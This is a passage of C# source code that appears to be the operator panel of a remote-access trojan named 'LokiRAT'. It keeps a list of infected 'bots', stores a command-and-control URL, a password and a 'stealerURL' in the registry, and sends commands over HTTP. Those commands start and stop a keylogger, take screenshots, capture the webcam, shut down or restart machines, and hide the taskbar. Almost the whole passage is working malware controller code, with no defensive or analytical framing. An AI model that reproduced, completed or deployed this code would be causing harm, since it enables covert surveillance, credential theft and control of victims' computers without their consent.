                    TimeSpan span = (TimeSpan) (DateTime.UtcNow - Convert.ToDateTime(strArray2[6]));
                    if (span.TotalSeconds < 100.0)
                    {
                        num = 1;
                    }
                    else
                    {
                        num = 0;
                    }
                    ListViewItem item = this.listView1.Items.Add(strArray2[0]);
                    item.ImageIndex = num;
                    item.SubItems.Add(strArray2[10]);
                    item.SubItems.Add(strArray2[1]);
                    item.SubItems.Add(strArray2[2]);
                    item.SubItems.Add(strArray2[3]);
                    if (strArray2[9] == "1")
                    {
                        item.SubItems.Add("Yes");
                    }
                    else
                    {
                        item.SubItems.Add("No");
                    }
                    item.SubItems.Add(strArray2[7] + " MB");
                    item.SubItems.Add(strArray2[8]);
                    num2++;
                }
                this.label17.Text = DateTime.Now.ToLongTimeString();
            }
            catch
            {
                this.label18.Text = "Disconnected";
            }
            for (num2 = 0; num2 < 0x270f; num2++)
            {
                lastCommand[num2] = "-1";
            }
        }

        public static string loadPage(string toHost)
        {
            string str = null;
            try
            {
                WebClient client = new WebClient();
                client.Headers["User-Agent"] = userAgent;
                str = client.DownloadString(connectionURL + "?pass=" + connectionPass + "&" + toHost);
            }
            catch
            {
                new configuration().ShowDialog();
            }
            return str;
        }

        private void logOffToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=computer|shutdown|/l /t 0");
        }

        private void main_Load(object sender, EventArgs e)
        {
            //new register().ShowDialog();
            string enadis = "1";
            if (enadis != null)
            {
                if (!(enadis == "0"))
                {
                    if (enadis == "1")
                    {
                        try
                        {
                            RegistryKey key = Registry.CurrentUser.CreateSubKey("LokiRAT");
                            this.label14.Text = connectionURL = key.GetValue("connectionURL").ToString();
                            this.label15.Text = connectionPass = key.GetValue("connectionPass").ToString();
                            this.label11.Text = stealerURL = key.GetValue("stealerURL").ToString();
                        }
                        catch
                        {
                            new configuration().ShowDialog();
                        }
                        for (int i = 0; i < 0x270f; i++)
                        {
                            lastCommand[i] = "-1";
                        }
                        this.listBox1.Items.Add("");
                        this.listBox1.SelectedIndex = 0;
                    }
                }
                else
                {
                    this.adminToolStripMenuItem.Enabled = false;
                    this.refreshToolStripMenuItem.Enabled = false;
                    this.builderToolStripMenuItem.Enabled = false;
                    this.connectionToolStripMenuItem.Enabled = false;
                    this.timer2.Stop();
                }
            }
        }

        private void offToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=monitor|off");
        }

        private void oNToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=monitor|on");
        }

        private void openToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=cdrom|open|E");
        }

        private void openToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=cdrom|open|" + this.toolStripComboBox1.Text);
        }

        private void printToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new print().ShowDialog();
        }

        private void processManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                int num = this.listView1.SelectedIndices[0];
                new processManager().ShowDialog();
            }
            catch
            {
                MessageBox.Show("You must select bot first!", "Select bot | LokiRAT", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        private void programManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new programManager().ShowDialog();
        }

        private void registryManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new registry().ShowDialog();
        }

        private void reloadToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            this.Cursor = Cursors.WaitCursor;
            this.loadBots();
            this.Cursor = Cursors.Default;
            this.listBox1.Items.Add("Bots loaded");
            this.listBox1.SelectedIndex = this.listBox1.Items.Count - 1;
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=computer|shutdown|/r /t 0");
        }

        private void screenshootToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=screen");
            new screenshot().ShowDialog();
        }

        private void scriptToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new scripting().ShowDialog();
        }

        public static void sendToHost(string toHost)
        {
            try
            {
                WebClient client = new WebClient();
                client.Headers["User-Agent"] = userAgent;
                client.DownloadString(connectionURL + "?pass=" + connectionPass + "&id=" + currentID + "&" + toHost);
            }
            catch
            {
            }
        }

        private void showToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=icons|show");
        }

        private void showToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=taskbar|show");
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=computer|shutdown|/s /t 0");
        }

        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=ckeyboard|start");
        }

        private void stopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=ckeyboard|stop");
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            this.label19.Text = DateTime.UtcNow.ToLongTimeString();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            this.timer2.Stop();
            try
            {
                Uri address = new Uri(connectionURL + "?pass=" + connectionPass + "&type=response&id=" + currentID);
                if (currentID != "{-error-}")
                {
                    this.wbt.DownloadStringAsync(address);
                }
            }
            catch
            {
            }
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=uninstall");
        }

        private void visitPageToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new visitpage().ShowDialog();
        }

        private void wbt_Downloaded(object sender, DownloadStringCompletedEventArgs e)
        {
            int index = this.listView1.SelectedIndices[0];
            string[] strArray = new string[9];
            try
            {
                strArray = Regex.Split(e.Result, "{-}");
                this.botsA[this.listView1.SelectedIndices[0], 5] = this.label13.Text = strArray[3] + " ms";
                this.botsA[this.listView1.SelectedIndices[0], 6] = this.label12.Text = strArray[2];
                if (((lastCommand[index] != strArray[0]) && (strArray[0] != " ")) && (strArray[0] != ""))
                {
                    lastCommandText[index] = strArray[1];
                    lastCommand[index] = strArray[0];
                    if (strArray[1].Length >= 70)
                    {
                        strArray[1] = strArray[1].Substring(0, 70);
                    }
                    this.listBox1.Items.Add(currentID + ": " + strArray[1]);
                    this.listBox1.SelectedIndex = this.listBox1.Items.Count - 1;
                }
            }
            catch
            {
            }
            this.timer2.Start();
        }

        private void webcamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            sendToHost("type=command&command=webcam");
            new webcam().ShowDialog();
        }
    }
}

